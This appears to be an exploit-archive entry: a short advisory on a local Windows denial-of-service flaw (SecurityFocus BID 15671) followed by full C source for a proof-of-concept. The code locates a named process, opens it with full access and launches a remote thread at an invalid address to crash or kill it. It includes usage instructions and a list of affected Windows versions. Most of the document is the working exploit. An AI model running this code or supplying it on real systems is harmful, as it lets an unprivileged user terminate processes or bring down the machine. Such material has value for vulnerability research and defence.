source: http://www.securityfocus.com/bid/15671/info

Microsoft Windows is prone to a local denial of service vulnerability. This issue can allow an attacker to trigger a system wide denial of service condition or terminate arbitrary processes.

Reports indicate that a process can call the 'CreateRemoteThread' function to trigger this issue.

It was reported that this attack can be carried out by a local unprivileged user.

#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

BOOL exploit(char* chProcessName)
{

        HANDLE hProcessSnap = NULL;

        HANDLE hProcess = NULL;

        BOOL bFound = FALSE;

        BOOL bRet = FALSE;

        PROCESSENTRY32 pe32 = {0};

        UINT uExitCode = 0;

        DWORD dwExitCode = 0;

        LPDWORD lpExitCode = &dwExitCode;





        hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (hProcessSnap == INVALID_HANDLE_VALUE)
    return (FALSE);

   pe32.dwSize = sizeof(PROCESSENTRY32);

    printf("\n[+] Search For Process ... \n");


   while(!bFound && Process32Next(hProcessSnap, &pe32))
   {
       if(lstrcmpi(pe32.szExeFile, chProcessName) == 0)
           bFound = TRUE;

   }

   CloseHandle(hProcessSnap);

   if(!bFound){

                SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE),
    FOREGROUND_RED| FOREGROUND_INTENSITY)          ;


           printf("[-] Sorry Process Not Find \n");

           return(FALSE);

  }
   printf("[+] Process Find \n");

   hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);


   if(hProcess == NULL){


        SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE),
    FOREGROUND_RED| FOREGROUND_INTENSITY)          ;


   printf("[-] Sorry Write Access Denied for This Process \n");
   printf("[-] Exploit Failed  :( \n");

   return(FALSE);
   }


   printf("[+] Write Access Is allowed \n");

   printf("[+] Send Exploit To Process ...\n");

   CreateRemoteThread(hProcess,0,0,(DWORD (__stdcall *)(void *))100,0,0,0);

   printf("[+] Successful  :)\n");


   return(pe32.th32ProcessID);
}

int main(int argc,char **argv)
{
char* chProcess = argv[1];

       COORD coordScreen = { 0, 0 };
   DWORD cCharsWritten;
    CONSOLE_SCREEN_BUFFER_INFO csbi;
    DWORD dwConSize;
    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);

    GetConsoleScreenBufferInfo(hConsole, &csbi);
    dwConSize = csbi.dwSize.X * csbi.dwSize.Y;
    FillConsoleOutputCharacter(hConsole, TEXT(' '), dwConSize,
        coordScreen, &cCharsWritten);
    GetConsoleScreenBufferInfo(hConsole, &csbi);
    FillConsoleOutputAttribute(hConsole, csbi.wAttributes, dwConSize,
        coordScreen, &cCharsWritten);
    SetConsoleCursorPosition(hConsole, coordScreen);

        SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE),
    FOREGROUND_GREEN| FOREGROUND_INTENSITY)        ;


   if(argc < 2) {


        printf("\n");
    printf("
    ==========================================================================   \n");
        printf("  >              Microsoft Windows CreateRemoteThread
        Exploit              <   \n");
    printf("  >            BUG Find By Q7X ( Nima Salehi ) Q7X@Ashiyane.com
    <   \n");

        printf("  >           Exploited By Q7X ( Nima Salehi )
        Q7X@Ashiyane.com            <   \n");
         SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE),
    FOREGROUND_RED | FOREGROUND_INTENSITY|FOREGROUND_GREEN|FOREGROUND_BLUE);


    printf("  >  Compile   : cl -o nima.c   ( Win32/VC++ )
    <   \n");

        printf("  >  Usage     : nima.exe  Process
        <   \n");
        printf("  >  Example   : nima.exe  explorer.exe
        <   \n");
        printf("  >  Tested on : Windows XP (SP0 ,SP1 ,SP2) , Windows 2000
        AdvServer (SP4) <   \n");
    printf("  >              Windows 2000 Server (SP4), Windows 2003 (SP0 ,
    SP1)       <   \n");
        SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE),
    FOREGROUND_RED| FOREGROUND_INTENSITY)          ;

        printf("  >     Copyright 2002-2005 By Ashiyane Digital Network
        Security Team      <   \n");
    printf("  >     www.Ashiyane.com ( Free )        www.Ashiyane.net ( Not
    Free )     <   \n");

        printf("  >              Special Tanx To My Best Friend Behrooz_Ice
        <   \n");

        printf("
        ==========================================================================  \n");


  }
    else

  exploit(chProcess);





 SetConsoleTextAttribute(GetStdHandle(STD_OUTPUT_HANDLE),
    FOREGROUND_RED |FOREGROUND_GREEN|FOREGROUND_BLUE);


}

